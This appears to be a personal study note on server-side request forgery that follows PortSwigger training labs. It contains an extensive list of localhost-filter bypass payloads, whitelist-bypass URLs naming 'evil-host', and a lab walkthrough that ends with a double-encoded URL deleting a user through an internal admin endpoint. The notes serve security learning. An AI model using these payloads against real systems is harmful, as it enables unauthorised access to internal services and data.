**Basic SSRF against the local server**

- Basic SSRF : 
![[SSRF1.png]]

![[SSRF2.png]]

**Basic SSRF against another back-end system**

- Other easy case : 
![[SSRF3.png]]

**SSRF with blacklist-based input filter**

`Bypass with double encoding `: https://owasp.org/www-community/Double_Encoding
`BYpass with url structure` : 127.0.0.1 --> 127.1  https://highon.coffee/blog/ssrf-cheat-sheet/
Localhost bypass:

```bash
All IPv4: 0
All IPv6: ::
All IPv4: 0.0.0.0
Localhost IPv6: ::1
All IPv4: 0000
All IPv4: (Leading zeros): 00000000
IPv4 mapped IPv6 address: 0:0:0:0:0:FFFF:7F00:0001
8-Bit Octal conversion: 0177.00.00.01
32-Bit Octal conversion: 017700000001
32-Bit Hex conversion: 0x7f000001
```

Various bypasses:

```bash
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
```

`Look for Domain that resolve 127.0.0.1`

**SSRF with whitelist-based input filters**

The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method:

- You can embed credentials in a URL before the hostname, using the `@` character. For example:
    
    `https://expected-host:fakepassword@evil-host`
- You can use the `#` character to indicate a URL fragment. For example:
    
    `https://evil-host#expected-host`
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:
    
    `https://expected-host.evil-host`
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try [double-encoding](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding) characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.

- You can use combinations of these techniques together.

Example : 

1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the `stockApi` parameter to `http://127.0.0.1/` and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to `http://username@stock.weliketoshop.net/` and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a `#` to the username and observe that the URL is now rejected.
5. Double-URL encode the `#` to `%2523` and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to:
    
    `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`


You can also proc a ssrf with an Open redirect . Check this link for a little reminder : https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection

 **Blind SSRF with out-of-band detection**
 
Lab : https://portswigger.net/web-security/ssrf/blind


**Blind SSRF with Shellshock exploitation**

Lab: https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation

Resource : 
https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient